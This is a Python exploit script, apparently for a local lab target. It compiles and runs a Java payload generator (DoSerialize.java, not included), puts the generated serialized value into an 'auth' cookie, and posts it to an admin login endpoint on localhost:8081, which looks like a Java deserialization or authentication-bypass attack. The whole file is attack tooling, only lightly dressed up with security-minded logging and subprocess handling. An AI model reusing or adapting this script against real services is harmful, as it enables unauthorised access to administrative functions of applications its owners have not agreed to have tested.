import requests
import shlex
import subprocess
from subprocess import PIPE
import logging
import re

# Configure logging with proper sanitization
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='application.log'
)
logger = logging.getLogger('exploit')

def sanitize_log_data(data):
    """Sanitize data before logging to prevent log injection"""
    if isinstance(data, bytes):
        data = data.decode('utf-8', errors='replace')
    # Remove control chars and potential log forging characters
    return re.sub(r'[\n\r\t]', '', str(data))

def console(cmd):
    """Execute command securely without shell=True"""
    try:
        # Using subprocess.run instead of Popen for better security
        if isinstance(cmd, str):
            cmd = shlex.split(cmd)  # Parse command properly
        proc = subprocess.run(cmd, stdout=PIPE, stderr=PIPE, check=True, shell=False)
        return (proc.returncode, proc.stdout, proc.stderr)
    except subprocess.SubprocessError as e:
        logger.error(f"Command execution failed: {sanitize_log_data(str(e))}")
        return (1, b"", str(e).encode())

# Execute Java commands securely
compile_result = console(["javac", "DoSerialize.java"])
if compile_result[0] != 0:
    logger.error(f"Compilation failed: {sanitize_log_data(compile_result[2])}")
else:
    cookieval = console(["java", "DoSerialize"])
    if cookieval[0] == 0:
        cookie = {'auth': sanitize_log_data(cookieval[1].strip())}
        try:
            r = requests.post(
                'http://localhost:8081/admin/login', 
                cookies=cookie, 
                data=" ", 
                allow_redirects=True
            )
            # Safely log response data
            logger.info(f"Response status: {r.status_code}")
            # Print to console, but log safely
            print(r.text)
        except requests.RequestException as e:
            logger.error(f"Request failed: {sanitize_log_data(str(e))}")

